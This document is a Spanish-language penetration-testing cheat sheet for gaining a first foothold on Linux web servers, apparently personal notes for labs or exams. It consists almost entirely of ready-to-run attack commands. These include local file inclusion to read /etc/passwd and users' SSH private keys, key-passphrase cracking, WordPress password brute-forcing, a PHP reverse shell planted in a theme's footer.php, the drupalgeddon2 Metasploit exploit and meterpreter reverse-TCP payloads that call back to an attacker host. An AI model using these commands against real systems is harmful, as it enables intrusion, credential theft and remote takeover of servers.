# FOOTHOLD LINUX — LFI y CMS

## LFI — Local File Inclusion
```bash
curl http://<TARGET_IP>/index.php?referer=..//..//..//..//etc/passwd

# Buscar claves SSH
# http://<TARGET_IP>/page.php?doc=../../home/<USER>/.ssh/id_rsa
nano id_rsa && chmod 600 id_rsa
ssh -i id_rsa <USER>@<TARGET_IP>

ssh2john id_rsa > hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

## WordPress
```bash
wpscan --url http://<TARGET_IP>/blog --enumerate u,vp
wpscan --url http://<TARGET_IP>/blog --passwords /usr/share/wordlists/rockyou.txt --usernames admin

msfvenom -p php/reverse_php LHOST=<LHOST> LPORT=443 -f raw > pwned.php
# Pegar en Appearance → Theme Editor → footer.php
nc -nlvp 443
```

## Drupal
```bash
dirb http://<TARGET_IP>
msfconsole -q -x "use exploit/unix/webapp/drupal_drupalgeddon2; set RHOSTS <TARGET_IP>; set TARGETURI /drupal/; run; exit -y"

find / -name settings.php 2>/dev/null
```

## DNS Zone Transfer
```bash
dig axfr <DOMAIN> @<DNS_SERVER_IP>
```

## Payloads Linux
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf > payload
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf -o payload.elf
msfvenom -p php/reverse_php LHOST=<LHOST> LPORT=<LPORT> -f raw > shell.php

# TTY
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z → stty raw -echo && fg → export SHELL=/bin/bash
```
